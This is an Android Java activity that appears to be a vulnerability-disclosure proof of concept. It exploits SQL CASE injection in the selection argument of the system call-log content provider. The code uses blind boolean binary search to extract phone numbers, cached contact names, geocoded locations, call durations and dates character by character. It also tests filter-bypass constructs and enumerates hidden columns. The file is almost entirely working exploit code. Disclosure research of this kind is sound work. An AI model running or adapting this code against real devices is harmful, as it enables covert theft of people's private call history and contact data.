package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class CallLogCaseInjectionActivity extends Activity {
    private static final String TAG = "CallLogCaseInj";
    private static final Uri CALLS_URI = Uri.parse("content://call_log/calls");
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(9);
        logView.setText("CallLog CASE Injection PoC\nUID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private int queryCount(String selection) {
        try {
            Cursor c = getContentResolver().query(CALLS_URI, new String[]{"_id"}, selection, null, null);
            if (c != null) {
                int count = c.getCount();
                c.close();
                return count;
            }
        } catch (Exception e) {
            log("  ERR: " + e.getMessage());
            return -1;
        }
        return -1;
    }

    private void runTests() {
        log("=== Test 1: Confirm CASE injection ===");
        int normal = queryCount(null);
        int caseTrue = queryCount("CASE WHEN 1=1 THEN 1 ELSE 0 END = 1");
        int caseFalse = queryCount("CASE WHEN 1=0 THEN 1 ELSE 0 END = 1");
        log("Normal: " + normal + ", CASE true: " + caseTrue + ", CASE false: " + caseFalse);

        if (caseTrue <= 0) {
            log("CASE injection not working. Aborting.");
            return;
        }

        // Test 2: Try CASE with column references to extract data
        log("\n=== Test 2: Column-based CASE extraction ===");
        // Extract call type (1=incoming, 2=outgoing, 3=missed)
        for (int type = 1; type <= 6; type++) {
            int count = queryCount("CASE WHEN type=" + type + " THEN 1 ELSE 0 END = 1");
            String[] typeNames = {"", "incoming", "outgoing", "missed", "voicemail", "rejected", "blocked"};
            String name = type < typeNames.length ? typeNames[type] : "type" + type;
            if (count > 0) log("  " + name + " calls: " + count);
        }

        // Test 3: Extract phone number characters via CASE
        log("\n=== Test 3: Extract phone number via CASE ===");
        // First check if number column is accessible
        int hasNumber = queryCount("CASE WHEN length(number) > 0 THEN 1 ELSE 0 END = 1");
        log("Entries with number: " + hasNumber);

        if (hasNumber > 0) {
            // Extract first number character by character
            StringBuilder phone = new StringBuilder();
            for (int pos = 1; pos <= 15; pos++) {
                int ch = extractCharViaCASE("number", pos);
                if (ch < 0) break;
                phone.append((char) ch);
            }
            log("Extracted number: " + phone);

            // Extract cached_name
            log("\n--- Cached name ---");
            int hasName = queryCount("CASE WHEN length(name) > 0 THEN 1 ELSE 0 END = 1");
            log("Entries with name: " + hasName);
            if (hasName > 0) {
                StringBuilder name = new StringBuilder();
                for (int pos = 1; pos <= 30; pos++) {
                    int ch = extractCharViaCASE("name", pos);
                    if (ch < 0) break;
                    name.append((char) ch);
                }
                log("Extracted name: " + name);
            }
        }

        // Test 4: Try to access other tables via CASE + subquery variants
        log("\n=== Test 4: Bypass SELECT filter ===");

        // Try WITH (CTE)
        int with1 = queryCount("1=1 AND (WITH t AS (VALUES(1)) 1)=1");
        log("WITH CTE: " + (with1 >= 0 ? "allowed" : "blocked"));

        // Try GLOB/LIKE with subquery
        int glob1 = queryCount("number GLOB '*'");
        log("GLOB: " + (glob1 >= 0 ? "allowed (" + glob1 + ")" : "blocked"));

        // Try CAST
        int cast1 = queryCount("CAST(1 AS INTEGER) = 1");
        log("CAST: " + (cast1 >= 0 ? "allowed (" + cast1 + ")" : "blocked"));

        // Try EXISTS without SELECT
        int exists1 = queryCount("EXISTS(VALUES(1))");
        log("EXISTS(VALUES): " + (exists1 >= 0 ? "allowed (" + exists1 + ")" : "blocked"));

        // Try IN with VALUES
        int in1 = queryCount("1 IN (VALUES(1))");
        log("IN VALUES: " + (in1 >= 0 ? "allowed (" + in1 + ")" : "blocked"));

        // Try unicode/substr on internal columns
        int unicode1 = queryCount("unicode(substr(number,1,1)) > 0");
        log("unicode(substr(number)): " + (unicode1 >= 0 ? "allowed (" + unicode1 + ")" : "blocked"));

        // Test 5: Try to enumerate columns via error messages
        log("\n=== Test 5: Column enumeration ===");
        String[] columns = {"_id", "number", "date", "duration", "type", "name",
            "numbertype", "numberlabel", "new", "geocoded_location",
            "phone_account_id", "phone_account_component_name",
            "features", "data_usage", "transcription", "voicemail_uri",
            "is_read", "ring_time", "last_modified", "block_reason",
            "call_screening_app_name", "call_screening_component_name",
            "add_for_all_users", "composer_photo_uri", "subject",
            "priority", "location", "missed_reason",
            "lookup_uri", "matched_number", "normalized_number",
            "photo_id", "formatted_number", "photo_uri"};
        for (String col : columns) {
            int r = queryCount("CASE WHEN length(" + col + ") >= 0 THEN 1 ELSE 0 END = 1");
            if (r > 0) log("  [EXISTS] " + col + ": " + r + " rows");
            else if (r == 0) log("  [EMPTY] " + col);
        }

        // Test 6: Extract geocoded_location
        log("\n=== Test 6: Extract geo location ===");
        int hasGeo = queryCount("CASE WHEN length(geocoded_location) > 0 THEN 1 ELSE 0 END = 1");
        log("Entries with geocoded_location: " + hasGeo);
        if (hasGeo > 0) {
            StringBuilder geo = new StringBuilder();
            for (int pos = 1; pos <= 40; pos++) {
                int ch = extractCharViaCASE("geocoded_location", pos);
                if (ch < 0) break;
                geo.append((char) ch);
            }
            log("Geo location: " + geo);
        }

        // Test 7: Extract call duration/date
        log("\n=== Test 7: Call metadata ===");
        int dur = extractNumberViaCASE("duration");
        log("First call duration (sec): " + dur);
        long dateMs = extractLongViaCASE("date");
        log("First call date (ms): " + dateMs);
        if (dateMs > 0) {
            log("  = " + new java.util.Date(dateMs));
        }

        log("\n=== ALL TESTS COMPLETE ===");
    }

    private int extractCharViaCASE(String column, int pos) {
        // Check length first
        int lenCheck = queryCount("CASE WHEN length(" + column + ") >= " + pos + " THEN 1 ELSE 0 END = 1");
        if (lenCheck <= 0) return -1;

        int lo = 0, hi = 127;
        while (lo < hi) {
            int mid = (lo + hi) / 2;
            int r = queryCount("CASE WHEN unicode(substr(" + column + "," + pos + ",1)) > " + mid + " THEN 1 ELSE 0 END = 1");
            if (r > 0) lo = mid + 1;
            else if (r == 0) hi = mid;
            else return -1;
        }
        return lo;
    }

    private int extractNumberViaCASE(String column) {
        int lo = 0, hi = 10000;
        while (lo < hi) {
            int mid = (lo + hi) / 2;
            int r = queryCount("CASE WHEN " + column + " > " + mid + " THEN 1 ELSE 0 END = 1");
            if (r > 0) lo = mid + 1;
            else if (r == 0) hi = mid;
            else return -1;
        }
        return lo;
    }

    private long extractLongViaCASE(String column) {
        long lo = 0, hi = System.currentTimeMillis() + 86400000L;
        while (lo < hi) {
            long mid = lo + (hi - lo) / 2;
            int r = queryCount("CASE WHEN " + column + " > " + mid + " THEN 1 ELSE 0 END = 1");
            if (r > 0) lo = mid + 1;
            else if (r == 0) hi = mid;
            else return -1;
        }
        return lo;
    }
}
